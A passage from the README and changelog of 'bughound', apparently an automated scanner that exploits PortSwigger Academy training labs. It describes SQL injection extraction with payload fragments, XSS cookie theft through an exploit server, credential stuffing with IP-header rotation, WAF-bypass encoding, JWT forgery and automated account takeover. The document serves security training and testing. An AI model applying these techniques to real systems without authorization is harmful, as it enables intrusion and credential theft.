   `calibrate_boolean_oracle`): calibration captures the TRUE and FALSE
   reference pages, and every later answer is judged by *closeness to the
   matching reference* -- correct for content-added, content-hidden and
   status-flip oracles alike.
3. **Character extraction followed DB collation.** String-ordering
   comparisons (`SUBSTRING(pw,i,1) < 'x'`) follow the database's collation,
   which interleaves case and reorders the alphabet -- the binary search
   converged to garbage on live instances. Extraction now uses
   **collation-independent ASCII-numeric comparisons**
   (`ASCII(SUBSTRING(...)) > m`) end to end.
4. **No ladder strategy could find an oracle without a finding.**
   **New strategy `sqli-blind-cookie-oracle` (priority 8)**: for
   "Blind SQL injection ..." titles it works finding-free -- every
   session-jar cookie against the seed URL plus cookie-consumer targets, two
   calibration requests per candidate, then the full extraction engine
   (binary search + login) on a synthetic finding where an oracle exists.
   Cookie-based TIME-based probes (pg_sleep/SLEEP/WAITFOR/DBMS_PIPE, both
   stacked and concat forms) joined cookie detection as well.

Verified end to end: a standalone probe solved the live instance (oracle ->
20-char password extraction with per-character equality verification -> CSRF
login -> platform banner flipped to "Solved"), and a faithful mock of the
measured live behaviour (large shop page, tiny welcome block, real SQL
engine behind the cookie, CSRF login, solved flip) is now driven from
"Not solved" to "Solved" by `run_scan` in the e2e suite. **+15 tests (226
total)**.

## What's new in 1.2.0 (hint-driven UNION objectives -- "finding a column containing text")

The 1.1.1 report fixed Oracle UNION extraction; the NEXT user lab exposed the
opposite failure: the objective was never a credential one at all.
"SQL injection UNION attack, finding a column containing text" states its
goal verbatim in the banner hint -- `Make the database retrieve the string:
'kNwvPL'` -- and flips to solved the moment that string comes back through
the vulnerable query. The ladder only knew the credential path (extract
users -> log in as administrator), which can never complete such labs: it
burned UNION extraction plus a boolean-blind fallback and reported
"attempted". 1.2.0 closes that gap generically:

- **The banner hint is now parsed** (`solving.LAB_HINT_RE`): the platform's
  own objective statement (`<p id="hint">...`) travels with the lab title
  into the objective engine.
- **New strategy `sqli-union-hint-objective` (priority 5)**: reads the hint,
  extracts the target string, discovers the UNION shape with the hardened
  1.1.1 engine (marker-validated column count, quote wrapper, per-position
  text compatibility, Oracle FROM dual), then fires the objective string
  through a TEXT column -- exactly what the platform asks for. Success is
  still judged by the solve phase's own banner re-check. Column-count-only
  UNION labs ("determining the number of columns") are recognised from the
  title and completed with a correctly-shaped NULL row.
- **Detection-miss fallback:** if the scan produced no re-targetable SQLi
  finding, the strategy falls back to the crawled GET query-param targets
  (bounded to 3) instead of stranding a lab whose title already vouches for
  the UNION family.
- **+10 tests (217 total)**: a faithful PostgreSQL mock built from live-lab
  measurements -- strings are legal ONLY in the middle UNION position
  (numeric/text/numeric typing), unquoted payloads stay valid literals (the
  1.1.1 trap), the category value is never echoed, and the solved oracle
  flips exactly when the hint string comes back through the query. The full
  pipeline must take it from "Not solved" to "Solved" autonomously.

## What's new in 1.1.1 (Oracle UNION trap -- the "listing the database contents on Oracle" fix)

Reported live against a real Academy instance: the tool detected the
boolean-based SQLi, tried "UNION credential extraction", failed, burned four
minutes on the boolean-blind fallback, solved nothing. Root cause (shape
discovery, not the dialect code): on the Oracle lab the backend query is
``... WHERE category = '<value>'`` -- EVERY value, including the engine's
UNQUOTED payloads, becomes part of the string literal. A plain
``Gifts UNION SELECT NULL,NULL-- -`` is therefore a VALID query that answers
**HTTP 200 with baseline rows only**. The quoted arms all error (Oracle needs
``FROM dual``), so the status-only candidate collector hoarded bogus
unquoted candidates for every column count -- which blocked the
``if not candidates:`` Oracle phase, failed every validation, and returned
``None`` from ``discover_union_shape``.

- **Validate-as-you-collect:** every candidate must now reflect a unique
  string marker through a REAL UNION arm before it is accepted
  (``_validate_shape``). A 200 alone proves nothing on string contexts.
- **The Oracle ``FROM dual`` phase always runs** when no plain candidate
  validates (previously: only when the plain phase collected zero
  candidates).
- Verified live end-to-end on the real instance: 2 columns -> Oracle 11g
  banner -> 75 tables via ``all_tables`` -> ``USERS_<rand>`` ranked first ->
  ``all_tab_columns`` -> credential rows -> automated administrator login ->
  platform ``is-solved`` banner.
- **+3 tests (207 total)**: a faithful Oracle trap mock (unquoted payloads
  are valid literals, no payload echo -- both verified against the live lab)
  pins shape discovery, full extraction, and the automated takeover login.

## What's new in 1.1.0 (dead-lab detection -- the "still not solved" fix)

Users kept reporting "the lab is still not solved" for URLs that could never
be solved by ANY tool: the Academy instances had **expired**. A dead instance
is deceptive -- the PortSwigger gateway keeps answering with `HTTP 504` and
the body `Server Error: Gateway Timeout (0) connecting to <lab-host>`, while
1.0.0's probe treated ANY response (including that error page) as "target is
reachable". Result: a 6+ minute module storm against a corpse, zero findings,
zero explanation. 1.1.0 makes the truth loud and instant:

- **Definitive dead-lab signature** (`http_client.lab_dead_response`): the
  gateway's error BODY is matched (`Gateway Timeout (N) connecting to ...`),
  not the status -- the Academy also throttles live labs with 504s, so the
  status alone is ambiguous. A body-matched death is definitive.
- **Fail-fast instead of back-off:** dead-lab 504s no longer open the adaptive
  throttle cooldown (which was sleeping 2-35s per request). A dead instance
  aborts the scan in ~2 seconds instead of grinding for minutes.
- **Pre-flight verdict:** the probe now fails on any non-2xx/3xx answer and
  prints an unmissable `LAB INSTANCE IS DEAD / EXPIRED / STOPPED` banner with
  exact next steps (Access the lab -> copy the NEW url -> check -> scan).
- **Mid-run death guards:** the death counter is checked between scan phases
  (after recon, after hunting, around exploit/solve). An instance that dies
  WHILE scanning stops the run loudly instead of returning a mystery-empty
  report. The exception unwinds cleanly -- reports are still written.
- **New CLI command `check`:** `python -m bughound check '<URL>'` gives an
  instant ALIVE / DEAD / UNREACHABLE verdict with the lab title and its
  solved status when the Academy banner is present. Exit code 0 only for
  ALIVE. Run it BEFORE every scan -- it costs one request.
- **+11 tests (204 total)**: dead-body matching, throttle-vs-death
  discrimination, fail-fast timing, pre-flight abort, mid-run death, live-lab
  false-positive guard, and both `check` verdicts.

## What's new in 1.0.0 (real-lab hardening: the chain now survives strict apps)

0.9.0's strategy ladder was proven on unit-level mocks with pre-seeded
findings. 1.0.0 replays the ENTIRE pipeline (crawl -> detect -> ladder ->
strategy) against strict, Academy-faithful mock applications -- per-session
CSRF enforcement, required comment fields with email validation, session
rotation on login, a 302-to-/login2 second factor, an internal-only admin
page, a sibling exploit server with a victim bot -- and fixes everything the
strictness exposed:

- **Two brand-new objective strategies (17 total):**
  - `exploit-server-cookie-steal` -- completes the "steal cookies with XSS"
    family end-to-end: posts the exfiltration payload as a stored comment,
    waits for the platform victim bot, reads the exploit server's access
    log, and replays the stolen session against the victim's account. The
    exploit server is discovered three ways (crawled sibling host, seed-page
    "Exploit server" anchor, platform naming convention) -- nothing is
    hardcoded per lab.
  - `cookie-role-flip` -- logs in canonically, flips privilege-bearing
    session cookies (`Admin=false`->`true`, `role=user`->`administrator`,
    numeric bumps), keeps the elevation for the panel's action requests, and
    completes the state-changing objective.
- **Strict-form survival:** every form the solver submits is completed with
  generic required-field values (email/name/website defaults) -- the old
  payload+csrf-only submissions were rejected by real comment forms.
- **2FA-bypass probe fix:** after login the solver now requests
  `/my-account?id=<the user it logged in as>` (plus the classic victim ids)
  -- the missing id-probe was exactly why "2FA simple bypass" labs stayed
  unsolved.
- **SSRF hardening:** the strategy no longer requires a detection finding
  (title hint + crawled stock-check endpoints are enough), probes
  `0.0.0.0`/decimal-IP loopback spellings, and sweeps the documented
  internal ranges (`192.168.0.x:8080`, budget-capped at 150) for the
  "SSRF against another local server" family.
- **Sibling-platform discovery:** the crawler records (but never fetches)
  same-registrable-domain sibling hosts, so the Academy exploit server is
  visible to the solver while the crawl stays same-origin.
- **Expired-lab loudness:** an unreachable Academy target now prints an
  explicit "instances EXPIRE -- spawn a fresh lab" banner instead of a bare
  abort, and every open objective ends the run with a concrete next-steps
  block (fresh instance / --aggressive / throttling / --solve-budget).
- **Brute-force list extended** with the Academy's published candidate
  wordlist for the IP-rotation credential-stuffing family.
- **+6 end-to-end tests** (193 total): each mock lab flips its own solved
  banner only on true objective completion, and the full unsupervised
  pipeline must flip it.

## What's new in 0.9.0 (generalized objective solver -- any lab, not one lab)

0.7.1 completed exactly ONE objective shape: SQLi -> extract administrator
credentials -> log in. Any training lab whose intended objective was anything
else (delete a user through an admin panel, bypass 2FA, store an XSS payload,
SSRF into an internal admin page, read a file, run `whoami`, forge a JWT...)
remained "not solved" forever -- the exact "it worked for that specific lab"
complaint. 0.9.0 replaces that ladder with a **goal-driven, detection-driven
objective engine** (`bughound/objectives.py`):

- **15 generic objective-completion strategies**, none of which references a
  concrete lab URL, path or credential: admin-panel discovery (crawled links
  + robots.txt `Disallow` + common paths) with markup-parsed state-changing
  actions (delete/promote user rows), `X-Original-URL`/`X-Rewrite-URL`
  access-control bypass, trusted-IP header bypass (`X-Custom-IP-Authorization`
  ...), canonical-account login + 2FA-skip (navigate straight to the
  authenticated page), bounded title-gated credential stuffing with
  `X-Forwarded-For` rotation, NoSQL `$ne`/`$regex` operator login bypass,
  stored-XSS via comment form (payload must survive RAW on re-fetch),
  reflected-XSS `alert(1)` triggers, SSRF into `http://localhost/admin` with
  the action replayed through the SAME SSRF channel, path-traversal goal
  files (`/etc/passwd`, `/home/carlos/secret`...), OS command `whoami`
  capture, JWT `alg:none` forgery -> admin panel action, and
  information-disclosure credential mining -> login.
- **The ladder is assembled from two signals**: the lab's own title (the
  platform prints the intended objective -- title keywords promote the
  technique a human would try first) and the scan's FINDINGS (an SSRF
  finding promotes the SSRF strategy, an access-control finding promotes the
  admin-panel strategy...). Both work; either alone works.
- **Success is always the platform's own oracle**: the solve phase re-reads
  the lab status banner after every strategy and stops at the first `Solved`.
  The report's "Objective completion" section now also lists the assembled
  ladder, so you can see exactly what was tried in what order.
- **Throttle resilience (root cause of the "starved" runs)**: the Academy
  rate-limits aggressive automated traffic, and the previous releases had
  ZERO handling for it -- a throttled crawl starved every later phase. The
  HTTP client now treats 429/503/504 as global back-pressure: an adaptive
  cooldown slows every phase (they share one client), idempotent GETs are
  retried once after the cooldown, and POSTs are never replayed. The scan
  log reports throttle events at the end.
- **Solve-phase request budget** (`--solve-budget`, default 220): completing
  an objective can never turn into an unbounded request storm.
- **Proven on 16 new tests / 11 mock Academy labs** (`tests/test_general_solver.py`),
  each flipping its own `is-solved` banner only when the intended objective is
  truly achieved: admin panel (linked + robots.txt-disclosed), X-Original-URL
  bypass, 2FA simple bypass, NoSQL operator injection, stored XSS comment,
  SSRF->internal admin delete, path traversal, OS command injection, JWT
  alg:none forgery -> delete carlos, bounded brute-force with IP rotation,
  throttle back-pressure behaviour, and ladder ordering.

## What's new in 0.8.0 (dialect-adaptive exploitation engine)

0.7.1 completed exactly ONE lab flavor (PostgreSQL, string context, 2
columns). 0.8.0 generalizes the SQLi exploit into a **dialect-adaptive
engine** -- verified on a fresh Academy lab flavour, *"SQL injection attack,
listing the database contents on **Oracle**"*, plus new mock labs for
PostgreSQL and MySQL:

- **`FROM dual` everywhere it belongs** (`bughound/exploits/sqli.py`): Oracle
  requires a FROM clause on every SELECT -- including each UNION arm. The
  old code appended `FROM dual` only inside shape discovery AND built the
  wrapper by slicing a fixed-length tail, which truncated it into SQL
  garbage (`Acc' UNION SEL`). The suffix is now decided in ONE place
  (`UnionContext.union_select()`), driven by `shape.from_dual`, and used by
  every payload site: shape validation, string-column discovery, dialect
  probing, table/column enumeration, row extraction, and the final proof
  payload. Wrapper reconstruction strips the EXACT tail it appended.
- **`_executed()` gate -- error pages can no longer fake success**:
  `Response.ok` only means "no transport error", so HTTP 500 pages passed
  every `r.ok` check. Error pages frequently echo payload fragments (stack
  traces, query echoes, ORA-/pg-identifier messages); a reflected marker
  then poisoned dialect detection and extraction. Every UNION payload site
  now requires 2xx/3xx + no SQL-error signature before trusting a response.
- **Oracle catalog handling**: larger marker caps (Oracle `LISTAGG` over
  `all_tables`/`all_tab_columns` overflows the old 500/1200-char caps;
  VARCHAR2 tops out at 4000), UPPERCASE identifier lookups
  (`all_tab_columns WHERE table_name=UPPER(...)`, results lowercased before
  fuzzy pairing), and credential-table ranking that prefers `user*`/`admin*`
  prefixes so decoys like `PRODUCT_USER_PROFILE` never shadow
  `USERS_<random>`.
- **PostgreSQL schema coverage**: table enumeration now lists every user
  schema (`table_schema NOT IN ('pg_catalog','information_schema')`) instead
  of only `public` -- apps routinely deploy data into named schemas.
- **Multi-dialect mock Academy labs** (`tests/test_dialect_labs.py`): a
  strict per-dialect SQL grammar emulator for Oracle / PostgreSQL / MySQL.
  Each mock REJECTS foreign-dialect payloads exactly like the real DBMS
  (missing `FROM dual` -> `ORA-00923`), evaluates the engine's extraction
  expressions against a randomized catalog (uppercase `USERS_X7Q2MA` on
  Oracle), flips the lab status on admin login, and asserts the objective is
  solved end-to-end on every dialect. 12 new tests; suite total: 171 passing.
- The 0.7.1 failure on Oracle is a named regression test now: a FROM-less
  UNION arm on the Oracle mock raises `ORA-00923`, forcing shape discovery
  through the `FROM dual` retry, and the exact wrapper reconstruction is
  unit-tested (`test_oracle_wrapper_reconstruction_is_exact`).

## What's new in 0.7.1 (objective completion / lab solver)

Detection and proof are not the goal -- **completing the exploit** is. When
the target is a training lab (PortSwigger Web Security Academy & friends),
bughound now drives the exploitation all the way to the platform's own
**"Solved"** banner and records the before/after evidence:

- **Solve phase** (`bughound/solving.py`): after the exploit + chain phases,
  the lab objective (parsed from the `academyLabHeader` markup) is checked
  live; if still open, bughound escalates through its full exploitation
  ladder -- UNION credential extraction -> admin login -> boolean-blind
  extraction -- re-checking the status after each attempt, and records the
  outcome as `result.objective` plus a dedicated report section
  ("Objective completion").
- **UNION shape-discovery fix**: the unquoted payload variant used to be
  tried first; on string contexts it stays *inside* the SQL literal (HTTP
  200 for every column count), so shape discovery locked onto bogus
  candidates and UNION extraction silently bailed out to the weaker
  tautology proof. Quoted variants are now tried first, which makes
  credential extraction + account takeover work on
  string-context endpoints (the overwhelming majority).
- **Marker-pollution fix**: pages that reflect the raw payload (search-term
  echo) made the extraction regexes capture SQL syntax (`'||version()||'`)
  instead of the evaluated UNION result. `_marker_match` now rejects
  pollution fingerprint matches (raw and HTML-escaped quote/concat
  fragments, SQL function names) and prefers the evaluated row.
- **Fuzzy credential-column pairing**: labs randomize schema names
  (`users_fzvkog`, `username_kd9fj2`, `password_hsallo`); exact-name-only
  pairing found nothing. Column discovery now fuzzy-matches user-ish and
  password-ish columns (user columns ranked before email, whose values are
  often NULL).
- Verified end-to-end against a live Academy lab: 2-column PostgreSQL UNION
  shape -> `users_<rnd>` table -> randomized credential columns ->
  administrator password extracted -> login -> lab status `is-solved`.
  12 new tests (including a mock Academy lab with a real status flip);
  suite total: 158 passing.

## What's new in 0.7.0 (sniper-squad edition)

Two battle-tested methodologies were folded into the agent's DNA --
[**Sn1per**](https://github.com/1N3/Sn1per) (phased offensive automation,
workspaces, continuous monitoring) and
[**Bug-Bounty-Agents**](https://github.com/matty69v/Bug-Bounty-Agents)
(phase-organized specialist personas, exploit chaining, hard scope
guardrails) -- and turned from shell-script / prompt folklore into
deterministic Python:

### Sn1per DNA: modes, workspaces, continuous monitoring

- **Scan modes** (`--mode stealth|normal|aggressive|nuke`), Sn1per-style:
  `stealth` = passive-only and throttled to concurrency 2 (WAF-friendly);
  `normal` = passive + active detection without the exploit phase;
  `aggressive` = the full pipeline; `nuke` = aggressive + opt-in
  default-credential checks + external tools forced on. Legacy
  `--aggressive`/`--no-exploit` flags keep working unchanged.
- **Airstrike multi-target scans** (`--targets-file targets.txt`): every
  line is authorized individually against the same scope/denylist and the
  run ends with a combined per-target summary.
- **Workspaces** (`--workspace <name>`): reports land under
  `reports/<workspace>/` with a `<host>-latest.json` snapshot.
- **Continuous monitoring**: `bughound diff old.json new.json` reports new
  findings, resolved findings, newly-exploited proofs and attack-surface
  additions/removals (subdomains, admin paths, API docs, backups...) --
  yesterday's surface vs today's, Sn1per-ASM style.
- **`bughound recon <url>`**: the recon phase as a standalone, strictly
  passive command with a console attack-surface summary.

### Bug-Bounty-Agents DNA: squads, planner, chainer

- **Squad orchestration** (`bughound/agents/squads.py`): every module is
  staffed on a named squad and runs in phases -- **RECON + CONFIG SQUAD**
  (passive, phase 1), then the **INJECTION + ACCESS SQUAD** hunters
  (phase 2), so intelligence steers payload work exactly like the
  recon-advisor -> web-hunter hand-off in the reference workflow.
- **Attack planner** (`agents/planner.py`): after phase 1 the planner
  writes a recon-informed **attack plan** (focus areas, tech-specific
  notes for WordPress/Spring/Next.js/..., WAF advice) into the scan and
  the report's new *Attack plan* section.
- **Exploit chainer** (`agents/exploit_chainer.py`): combines
  individually-proven findings into **attack chains** with full
  provenance (`chain_of` fingerprints):
  - path traversal -> credential-file read -> **account takeover**
    (proven end-to-end, CRITICAL),
  - SSRF -> **internal admin panel** on the target's own loopback (HIGH),
  - reflected XSS + cookie without HttpOnly -> **session hijacking**
    (evidence-composed, HIGH),
  - source-map/backup exposure -> **secret disclosure** (HIGH),
  - open redirect adjacent to OAuth -> **code interception** (candidate).
- **Six new active modules** (persona-flavoured, all differential and
  FP-guarded): `jwt-attacks` (alg=none confusion, guessable HMAC secret,
  kid hints -- only tokens the target itself issued, validated against a
  wrong-secret control first), `graphql-hunter` (endpoint discovery,
  introspection, GET introspection, field suggestions), `xxe-prober`
  (file-disclosure + error-based canary probes with no-DOCTYPE and
  harmless-entity controls), `host-header-poison` (Host /
  X-Forwarded-Host reflection into Location/body/cookie sinks,
  repeat-verified), `prototype-pollution` (server-side merge-echo proof +
  honestly-labelled client-side candidates), and `default-logins`
  (strictly opt-in via `--brute`/nuke mode: 4 pairs, failed-login-baseline
  verified, no lockout risk).
- **Bounty submission drafts**: every verified/exploited critical or high
  finding now carries a triage-ready submission skeleton (the
  report-generator persona), and the methodology appendix documents the
  chaining phase.

The false-positive machinery, denylist/authorization gate and safe-payload
rules from 0.5/0.6 apply to everything above unchanged: chains re-use only
already-proven read-only primitives, JWT attacks touch only tokens the
target issued, and default-credential checks are off unless explicitly
enabled.

## What's new in 0.6.2 (recon hardening)

Recon breadth brought up toward Sn1per-parity, while keeping the authorization
invariant that out-of-scope hosts are reported but never contacted:

- **Active subdomain brute force** joins the existing crt.sh (Certificate
  Transparency) lookup in `subdomain-enum` -- a ~90-entry wordlist resolved
  via DNS-over-HTTPS catches hosts that never had a logged TLS certificate.
- **Subdomain-takeover detection**: every resolved subdomain's CNAME is
  checked against 27 third-party-platform fingerprints (GitHub Pages,
  Heroku, S3, Azure, Netlify, Vercel, ...). Flagged from DNS evidence only --
  bughound never sends an HTTP request to a subdomain outside confirmed
  scope, so takeover candidates are reported as unconfirmed pending manual
  verification or a scope expansion + re-scan.
- **Favicon hash fingerprinting** (`tech-fingerprint`): a pure-Python
  MurmurHash3 implementation reproduces Shodan/Censys's `http.favicon.hash`,
  giving a single high-confidence value to pivot on across the internet for
  the exact product/version in use.
- **New `whois-recon` module**: registrar, creation/expiry dates,
  nameservers and registrant org via RDAP (`rdap.org`), the modern
  HTTPS-based successor to the WHOIS protocol -- no legacy WHOIS client
  needed.
- **New `wayback-urls` module**: harvests every URL archive.org's Wayback
  Machine has ever crawled for the target domain, and separately flags
  archived paths that look like backups/config/credential files
  (`.sql`, `.bak`, `.env`, `.pem`, ...) -- often the highest-yield recon
  source for endpoints the live site no longer links to.

## What's new in 0.6.1

- **Fixed: bare-path `--exploit-endpoint` silently failed.** Passing `--exploit-endpoint /product/stock` (path instead of full URL) produced the hostless URL `http:///product/stock`; every exploit request then failed with a synthetic status-0 response and the direct-exploit chain quietly did nothing (no error shown). Bare paths are now resolved against the scan target (`https://<target>/product/stock`), and the console prints the resolved URL. Regression-tested (5 new tests; suite at 107).

## What's new in 0.6

- **Raw-body direct exploitation (XML/JSON endpoints).** `--exploit-body '<stockCheck><productId>1</productId><storeId>{INJ}</storeId></stockCheck>'` turns any raw-body endpoint into a full injection target: every exploit strategy (UNION shape discovery, dialect probing, table/column enumeration, credential extraction, credential login) substitutes payloads at the `{INJ}` marker.
- **WAF-bypass payload encodings.** `--exploit-encode xml-entities` numeric-character-reference-encodes every payload at the injection point, so filters that scan the raw body for SQL keywords see nothing while the XML parser hands the original payload to the SQL engine.
- **Authorization UX fix.** `--i-am-authorized` alone now auto-scopes the scan to the exact target host (denylist still overrides; explicit `--authorize-host`/`--scope` still win). `--authorize-host` also accepts URLs and `host:port` and normalizes them to the hostname.
- **Dialect-detection fixes.** Version-banner matching no longer truncates real PostgreSQL banners (~126 chars); dialect probes are ordered most-specific-first (PostgreSQL's `||` probe cannot fire on MySQL, MySQL's `CONCAT` cannot be trusted alone on PostgreSQL); the Oracle static fallback now verifies the dialect via `FROM dual` instead of matching any database.
- **Raw-body evidence.** curl PoCs and raw HTTP exchanges for body-template targets render the actual (encoded) body with the correct Content-Type.

## What's new in 0.5

### 1. Exploits that complete the lab objective

- **Direct-exploit mode** — you already know the lab's vulnerable endpoint?
  Point the exploit engine straight at it and it runs the full chain
  (UNION extraction → credential dump → automatic login → account takeover),
  regardless of what the crawler/detector found:

  ```bash
  bughound scan https://lab.web-security-academy.net/ \
      --authorize-host lab.web-security-academy.net --i-am-authorized \
      --aggressive \
      --exploit-endpoint 'https://lab.web-security-academy.net/filter?category=Pets' \
      --exploit-param category
  ```

- **Broader lab dialect support**: Oracle (`FROM dual`, `v$version`,
  `all_tables`/`all_tab_columns`, `LISTAGG`) and MSSQL (`@@version`,
  `FOR XML PATH` enumeration) joined SQLite / MySQL / PostgreSQL for UNION and
  blind extraction.
- **More reliable UNION shape discovery**: candidate column counts are now
  validated by reflecting a unique marker through a string column, so
  suppressed-error endpoints can no longer lock the search onto a wrong count.
- Findings the detector missed as re-targetable are no longer dropped: the
  exploit engine reconstructs a request target from the finding and still
  attempts the chain.
- The console prints a dedicated **Exploit results** block at the end of the
  scan (one ✓ line per successful exploit), so exploitation status is
  impossible to miss.

### 2. False-positive verification (control experiments)

Every finding that the exploit phase could **not** prove is re-tested by
`bughound/verification.py` with a battery of control experiments, and the
report answers "how do we know this is not a false positive?" with the actual
results:

| Check | What it proves |
|---|---|
| `negative-control` | a payload with the active ingredient removed (no quote, no operator, no traversal...) does **not** trigger the signature — so the signature is input-specific, not page noise |
| `repeat-consistency` | the signature reproduces on every repeat request — real injection is deterministic; rotating banners and A/B content are not |
| `baseline-clean` | the unmodified request shows no signature |
| `fresh-canary-*` | reflection findings are re-tested with a unique random canary per check — stale markers can never fake a reflection |
| `directionality` | for boolean SQLi, TRUE must resemble baseline and FALSE must differ — in that direction only |
| `timing-jitter` | for time-based SQLi, baseline network jitter is small enough to trust the delay signal |

Findings that pass everything get a **LOW false-positive risk** verdict; any
failed check **downgrades** the finding (`verified=False`, `confidence=
tentative`) and prints a FAIL row in the report's *False-positive analysis*
table. A succeeded exploit is its own FP disproof and bypasses the battery.

### 3. Reports that show WHERE the vulnerability lives

- **`--source-dir <path>`**: give it the application's source code and every
  finding is mapped to the exact **file + line range + enclosing function +
  sink line** (marked with `->`) — e.g. `os.popen(f"ping -c 1 {host}")` at
  `examples/vulnerable_app.py:280`, inside `ping()`.
  Supports FastAPI/Flask-style decorators, Express/Node routes, Spring
  mappings, and PHP `$_GET` usage; sinks detected include SQL execute,
  shell exec, file read, server-side fetch, redirect and raw echo.
- **No source available?** (black-box lab) Each finding instead carries a
  clearly-labelled **reconstructed sink pattern** — the shape of code the
  input provably reaches, derived from the captured behavioural evidence
  (quote breaks query, tautology changes result set, command output echoes...).
- Every finding also shows its **injection point**
  (e.g. `GET /filter?category=... -> query-string parameter 'category'`).
- Methodology appendix documents the verification and code-attribution steps.

## Exploitation & proof (0.4 features, extended in 0.5)

Detection alone tells you "something looks wrong". bughound's **exploit phase**
(runs automatically in aggressive mode) goes further: every detected finding is
re-targeted with a **safe, non-destructive exploit** that demonstrates the
actual impact — and for SQLi that means **completing the attack objective**,
not just proving an error:

| Finding class | Exploit proof attempted |
|---|---|
| Error-based SQLi | Adaptive UNION extraction (column count + quote-context + string-column discovery): DB version banner, table list, **then real credential rows from any users/credential table** |
| UNION with credentials | **Automatic login** through the application's own login form with the extracted credentials → **ACCOUNT TAKEOVER** proof (failed-login baseline comparison, session markers) |
| Hidden data | Tautology injection (`' OR 1=1--`) that makes filtered-out records reappear — proven by measuring content growth beyond payload reflection |
| Boolean-blind SQLi | Character-by-character binary-search extraction of **a privileged user's password** (length + chars, hash auto-cracking), falling back to the DB version banner |
| Blind + extracted password | **Automatic login** → **ACCOUNT TAKEOVER** proof |
| Cookie SQLi (TrackingId-style) | Cookies are treated as injectable parameters end-to-end: detected, UNION-probed, blind-extracted — with the cookie override isolated to single requests |
| Time-based SQLi | Boolean-oracle upgrade probe, then extraction when possible |
| OS command injection | Runs `id` / `uname -sr` / `hostname` and captures the output — proves RCE **and which user** |
| Path traversal / LFI | Reads `/etc/passwd` (accounts listed) plus a second distinct file to prove the read is arbitrary |
| Reflected XSS | Verifies `<script>`, `onerror=`, `svg onload=` payloads survive unfiltered in an HTML context (content-type aware) |
| SSRF | Makes the target fetch **its own loopback address** and return its content — proves server-side fetching with data exfiltration |
| Open redirect | Walks and documents the full redirect chain (hop-by-hop) |
| NoSQL operator injection | Attempts a real authentication bypass via `[$ne]` and detects authenticated-page markers |
| Everything else | Gets a curl repro + raw HTTP exchange + impact statement + manual steps |

**Every exploited finding lands in the report with:**

- ✅ **EXPLOITED** badge and an executive-summary count,
- the **data extracted from the target** (DB banner, table names, **credential
  rows**, `/etc/passwd` lines, `uid=...` output, loopback fingerprints...),
- the **account-takeover proof** when extracted credentials successfully
  logged into the application (objective completion, not just a read),
- a **ready-to-run `curl` reproduction** (copy-paste, works as-is),
- the **verbatim raw HTTP request/response exchange** (Burp-style),
- numbered **manual reproduction steps** for triagers,
- a written **impact statement** per vulnerability class,
- the **Vulnerable code location** section (source-mapped sink or
  behaviour-derived reconstruction),
- the **False-positive analysis** section (control-experiment table + verdict).

When an exploit *cannot* be completed, the report says so honestly
(`Exploit phase result: ...`) and the finding keeps its detection-stage
evidence and confidence label — bughound never upgrades a finding it could
not prove.

**Safety rules of the exploit phase** (all enforced in code):

- Requires `--aggressive` **and** the normal authorization gate; disable
  independently with `--no-exploit` (CLI) or `"exploit": false` (web API).
- Strictly read-only / informational payloads: SQL extraction of metadata and
  credential rows, `id`/`uname`, system-file reads, marker reflections, and
  logins **using credentials the target itself leaked** (at most 2 attempts —
  a failed-login baseline plus the extracted credential — never brute-force).
  No data is modified, no destructive or denial-of-service payloads exist in
  the codebase.
- SSRF proofs target **loopback / the target itself only** — cloud metadata
  endpoints (169.254.169.254 etc.) are hard-blocked.
- Every exploit request flows through the same denylist-guarded HTTP client
  as the rest of the scan; cookie-override probes are restored immediately
  so the scanner's own session is never polluted.
- Per-finding request budgets keep the phase fast and gentle.

A full example report produced against the bundled vulnerable demo app is in
[`examples/sample-report.md`](examples/sample-report.md).

## Vulnerability classes covered

| Group | Classes | How |
|---|---|---|
| Injection | SQLi, NoSQLi, OS command injection, LDAP/Header (CRLF) injection, XXE* | active payloads + differential/error/time based |
| Broken access control | IDOR*, privilege escalation*, path traversal / LFI | traversal verified; IDOR/priv-esc surfaced as candidates |
| Server-side | SSRF, RCE (via command injection), deserialization*, race/TOCTOU* | SSRF differential; RCE via command exec |
| Auth & sessions | OAuth/SAML*, session fixation, brute-force*, MFA bypass*, cookie flags | cookie flags verified; auth flows flagged for manual testing |
| Client-side | XSS (reflected), CSRF, CORS, clickjacking | XSS/CORS/clickjacking verified; CSRF form heuristic |
| Logic & config | business logic*, information disclosure, security misconfig, TLS | exposed files/headers/dir-listing/TLS verified |
| Crypto | hardcoded secrets, JWT flaws (alg=none), weak hashing indicators | client-content scanning |
| **Reconnaissance** | subdomains, DNS records, tech stack, WAF, HTTP methods, JS endpoints, admin panels, API docs, backup files, source maps, emails, robots/sitemap | passive discovery (no payloads) |

`*` = surfaced as an honestly-labeled **candidate/advisory** finding for manual
verification (these classes generally need authenticated context or human
judgement). Findings are marked `verified` (proven) vs `confidence:
tentative/firm` so reports never overclaim.

## Reconnaissance (passive attack-surface mapping)

The recon layer is what makes bughound useful as a *recon* tool, not just a
vuln scanner. It runs **always-on in safe (passive) mode** and produces both
INFO-severity findings and a structured `recon` block in the JSON / Markdown
report. The 12 dedicated recon modules are:

| Module | What it discovers |
|---|---|
| `robots-sitemap` | `robots.txt`, `sitemap.xml`, `humans.txt`, `security.txt`, well-known endpoints — surfaces hidden paths |
| `dns-recon` | A / AAAA / MX / TXT / NS / CAA / SOA records via DNS-over-HTTPS (no `dnspython` needed) + SPF / DMARC posture |
| `subdomain-enum` | Subdomains from the Certificate Transparency log (crt.sh) |
| `tech-fingerprint` | Wappalyzer-style detection of web server, language, framework, CMS, CDN, analytics, JS libs |
| `waf-detection` | Cloudflare / AWS WAF / Akamai / Sucuri / Imperva / F5 / Fortinet / etc. |
| `http-methods` | OPTIONS-based method enumeration + risky-method flagging + TRACE-based XST check |
| `js-endpoints` | API endpoints / paths extracted from same-origin JS files (REST, GraphQL, internal) |
| `admin-panels` | 60+ common management paths (/admin, /wp-admin, /phpmyadmin, /actuator, /jenkins, /solr, /kibana, /grafana, ...) |
| `api-discovery` | Swagger / OpenAPI / GraphQL introspection / ReDoc / Spring HAL / RAML / api-docs |
| `backup-files` | `.bak` / `.old` / `.orig` / `~` / `.swp` / `.zip` / `.tar.gz` / `.sql` / `.save` / etc. variants of crawled paths |
| `sourcemap-exposure` | `.js.map` files that ship with minified bundles (leaks un-minified source) |
| `email-harvest` | Email addresses from HTML `mailto:` and free-text + same-origin JS |

Existing passive modules — `cookies`, `cors`, `info-disclosure` (now 80+ paths),
`secrets` (now 60+ patterns), `security-headers` (now 12 checks incl.
Permissions-Policy / COEP / COOP / CORP), `tls` — are also part of the recon
layer. The denylist always applies, so recon requests never touch forbidden
hosts / URLs.

## Install

